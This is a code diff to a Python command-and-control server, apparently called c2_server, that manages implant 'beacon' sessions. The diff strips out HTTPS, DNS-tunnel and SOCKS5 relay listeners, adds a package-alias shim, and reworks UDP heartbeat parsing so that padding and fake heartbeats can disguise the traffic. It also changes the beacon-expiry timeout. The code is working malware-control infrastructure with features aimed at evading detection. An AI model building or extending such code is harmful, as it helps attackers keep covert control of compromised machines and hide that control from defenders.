@@ -29,6 +29,18 @@ _PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 if _PROJECT_ROOT not in sys.path:
     sys.path.insert(0, _PROJECT_ROOT)
 
+# 目录名不叫 server 时（如仓库里叫 c2_server），把本包注册为 "server" 别名，
+# 使 `from server.xxx import` 的内置导入在直接运行 python3 server.py 时也能解析
+# （与 flowscan/c2_bridge.py 的别名逻辑一致）。
+_PKG_DIR = os.path.dirname(os.path.abspath(__file__))
+_PKG_NAME = os.path.basename(_PKG_DIR)
+if _PKG_NAME != "server" and "server" not in sys.modules:
+    try:
+        import importlib as _importlib
+        sys.modules["server"] = _importlib.import_module(_PKG_NAME)
+    except Exception:
+        pass  # 交给下方 import 报出原始错误
+
 from server.core.config import load_config, ServerConfig, _is_hex64
 from server.core.log import setup_logging, get_logger
 from server.core.events import (
@@ -120,37 +132,6 @@ class PyExec2Server:
         self._dispatcher = Dispatcher(self._ctx)
         self._console = Console(self._dispatcher)
 
-        # HTTPS 传输监听（f8）：证书 data/https_tls.*
-        # （依赖 dispatcher/smods——结果处理器 + auto_commands 共用）
-        self._https = None
-        if config.https_port and config.https_port > 0:
-            self._https = self._make_https_transport(config)
-
-        # DNS 隧道监听（f8 基础版）
-        self._dns = None
-        if config.dns_port and config.dns_port > 0:
-            from server.infra.dns_listener import _DnsServer
-            self._dns = _DnsServer(
-                host=config.server_host, port=config.dns_port,
-                key=self._key_implant,
-                mgr=self._mgr, tq=self._tq, events=self._events,
-                config=config, smods=self._smods,
-                dispatcher=self._dispatcher)
-
-        # 中继通道（13/14）：socks5 动态代理 + 端口转发
-        self._hub = None
-        self._socks5 = None
-        if config.relay_port and config.relay_port > 0:
-            from server.infra.relay import RelayHub, Socks5Server
-            self._hub = RelayHub(
-                host=config.relay_host, relay_port=config.relay_port,
-                tq=self._tq, modules=self._modules,
-                fallback_beacon=lambda: self._dispatcher.current_beacon)
-            self._dispatcher.hub = self._hub
-            if config.socks5_port and config.socks5_port > 0:
-                self._socks5 = Socks5Server(
-                    config.relay_host, config.socks5_port, self._hub)
-
         self._listener: Listener | None = None
         self._cleanup_thread: threading.Thread | None = None
 
@@ -169,24 +150,6 @@ class PyExec2Server:
         self._start_cleanup()
         self._start_listener()
         self._start_udp_heartbeat()
-        if self._hub:
-            self._hub.start()
-            logger.info("relay listening %s:%d", self._config.relay_host,
-                        self._config.relay_port)
-        if self._socks5:
-            self._socks5.start()
-            logger.info("SOCKS5 listening %s:%d", self._config.relay_host,
-                        self._config.socks5_port)
-        if self._https:
-            self._https.start()
-            logger.info("HTTPS transport listening %s:%d",
-                        self._config.server_host,
-                        self._config.https_port)
-        if self._dns:
-            self._dns.start()
-            logger.info("DNS transport listening %s:%d",
-                        self._config.server_host,
-                        self._config.dns_port)
 
         if self._headless:
             logger.info("headless mode: 事件写 %s，运行日志见 log_file。"
@@ -214,26 +177,6 @@ class PyExec2Server:
             try:
                 self._udp_sock.close()
             except OSError:
-                pass
-        if self._hub:
-            try:
-                self._hub.stop()
-            except Exception:
-                pass
-        if self._socks5:
-            try:
-                self._socks5.stop()
-            except Exception:
-                pass
-        if self._https:
-            try:
-                self._https.stop()
-            except Exception:
-                pass
-        if self._dns:
-            try:
-                self._dns.stop()
-            except Exception:
                 pass
         if self._console:
             self._console.stop()
@@ -284,8 +227,11 @@ class PyExec2Server:
                     break
                 if len(data) < 24:
                     continue
-                # M4：心跳包 = <bid 16 字符 hex><HMAC(_K, bid)[:8]>
-                bid = data[:-8].decode("ascii", "replace")
+                # M4：心跳包 = <bid 16 字符 hex><填充 0-40B 可选><HMAC(_K, bid)[:8]>
+                # ——bid 取固定 16 字节前缀,mac 取帧尾 8 字节,中间填充为
+                # 流量混淆(2026-08-25)忽略;假心跳(纯随机)bid 前缀查不到或
+                # MAC 校验失败,自然忽略。
+                bid = data[:16].decode("ascii", "replace")
                 mac = data[-8:]
                 rec = self._mgr.get_client(bid)
                 if rec is None:
@@ -327,31 +273,6 @@ class PyExec2Server:
             return None
         return ctx
 
-    def _make_https_transport(self, config):
-        """创建 HTTPS 传输监听器（证书缺失自动生成）。"""
-        from server.infra.https_listener import HttpsTransport
-        from server.s_modules.tls_util import generate_self_signed
-        data_dir = os.path.join(config.base_dir, "data")
-        os.makedirs(data_dir, exist_ok=True)
-        cert_file = os.path.join(data_dir, "https_tls.crt")
-        key_file = os.path.join(data_dir, "https_tls.key")
-        if not (os.path.isfile(cert_file) and os.path.isfile(key_file)):
-            try:
-                generate_self_signed(config.server_host, data_dir)
-                if os.path.isfile(os.path.join(data_dir, "proxy.crt")):
-                    os.replace(os.path.join(data_dir, "proxy.crt"), cert_file)
-                    os.replace(os.path.join(data_dir, "proxy.key"), key_file)
-            except Exception as e:
-                logger.error("HTTPS 证书生成失败: %s", e)
-                return None
-        return HttpsTransport(
-            host=config.server_host, port=config.https_port,
-            key=self._key_implant,
-            mgr=self._mgr, tq=self._tq, events=self._events,
-            cert_file=cert_file, key_file=key_file,
-            config=config, smods=self._smods,
-            dispatcher=self._dispatcher)
-
     def _make_session(self, conn: socket.socket, key: bytes,
                       expected_role: str):
         """按端口角色构造会话（T4.3/T4.4）。"""
@@ -370,7 +291,6 @@ class PyExec2Server:
         components = dict(
             mgr=self._mgr, tq=self._tq, logger=self._events,
             config=self._config, modules=self._modules, smods=self._smods,
-            hub=self._hub,
         )
         if expected_role == "beacon":
             return BeaconSession(
@@ -387,7 +307,7 @@ class PyExec2Server:
             while self._running:
                 time.sleep(60)
                 offline = self._mgr.get_offline_clients(
-                    timeout=self._config.client_timeout)
+                    timeout=self._config.beacon_expire_seconds)
                 for c in offline:
                     if c.active:
                         continue  # 活跃会话（正在执行任务）不清理
